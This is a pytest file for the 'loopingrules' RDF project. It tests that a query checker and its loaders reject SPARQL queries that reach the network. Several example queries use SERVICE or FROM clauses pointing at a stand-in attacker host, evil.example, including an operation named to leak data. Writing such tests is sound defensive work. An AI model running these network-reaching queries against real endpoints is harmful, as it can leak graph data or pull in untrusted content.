import pytest
from rdflib import Graph

from loopingrules.controllers import load_controllers
from loopingrules.operations import load_operations
from loopingrules.security import UnsafeQuery, check_query

PFX = "@prefix lr: <https://loopingrules.org/ns#> . @prefix ex: <https://example.org/> .\n"


@pytest.mark.parametrize("q", [
    "SELECT * WHERE { SERVICE <http://evil.example/sparql> { ?s ?p ?o } }",
    "SELECT * WHERE { ?s ?p ?o . OPTIONAL { SERVICE SILENT <http://evil.example/> { ?a ?b ?c } } }",
    "SELECT * FROM <http://evil.example/data.ttl> WHERE { ?s ?p ?o }",
    "SELECT * FROM NAMED <http://evil.example/g> WHERE { GRAPH ?g { ?s ?p ?o } }",
])
def test_network_reaching_queries_are_rejected(q):
    with pytest.raises(UnsafeQuery):
        check_query(q)


def test_plain_queries_pass():
    check_query("SELECT (COUNT(?s) AS ?score) WHERE { ?s ?p ?o FILTER NOT EXISTS { ?s a ?t } }")


def test_operation_with_service_is_refused_at_load():
    g = Graph().parse(data=PFX + '''
        ex:leak a lr:Operation ;
          lr:where "?s ?p ?o . SERVICE <http://evil.example/sparql> { ?s ?p ?o }" ;
          lr:insert "?s ex:leaked true" .''', format="turtle")
    with pytest.raises(UnsafeQuery, match="SERVICE"):
        load_operations(g)


def test_controller_with_service_is_refused_at_load():
    g = Graph().parse(data=PFX + '''
        ex:c a lr:Controller ;
          lr:query "SELECT (1 AS ?score) WHERE { SERVICE <http://evil.example/> { ?s ?p ?o } }" .''',
        format="turtle")
    with pytest.raises(UnsafeQuery):
        load_controllers(g)
